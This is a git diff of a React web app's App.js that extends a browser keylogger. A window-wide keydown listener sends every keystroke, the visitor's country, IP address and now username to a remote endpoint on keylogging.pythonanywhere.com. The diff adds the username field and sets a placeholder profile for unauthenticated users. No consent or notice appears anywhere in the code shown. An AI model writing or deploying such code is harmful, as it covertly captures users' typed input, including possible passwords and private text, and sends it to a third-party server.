@@ -13,17 +13,15 @@ import { userContext } from './contexts/UserContext';
 import RequireAuth from './admin/RequireAuth';
 import Signup from './Signup';
 
-const CaptureKey = (key, location, ip_address) => {
-  fetch('https://keylogging.pythonanywhere.com/api/new_keylog', {
-    // fetch('http://127.0.0.1:5000/api/new_keylog', {
+const CaptureKey = (key, location, ip_address, user) => {
+  // fetch('https://keylogging.pythonanywhere.com/api/new_keylog', {
+    fetch('https://keylogging.pythonanywhere.com/api/new_keylog', {
     method: 'POST',
-    body: JSON.stringify({ key, location, ip_address }),
+    body: JSON.stringify({ key, location, ip_address, user }),
 
   }).then(responce => {
     if (!responce.ok) {
       console.log("There was an error")
-    } else {
-      console.log("Captured")
     }
     return responce.json();
   }).then(data => {
@@ -42,9 +40,8 @@ function App() {
   isBrowser &&
   window.addEventListener('keydown', function (e) {
     // e.preventDefault()
-    location && CaptureKey(e.key, location.country_name, location.IPv4)
+    location && userProfile && CaptureKey(e.key, location.country_name, location.IPv4, userProfile.username)
   }, false);
-
 
   useEffect(() => {
     fetch('https://keylogging.pythonanywhere.com/api/profile', {
@@ -56,6 +53,7 @@ function App() {
     }).then(responce => {
       if (!responce.ok) {
         localStorage.clear()
+        setUserProfile({username: 'Unauthenticated', userType : 'USER'})
       } else {
         console.log('Logged in')
       }
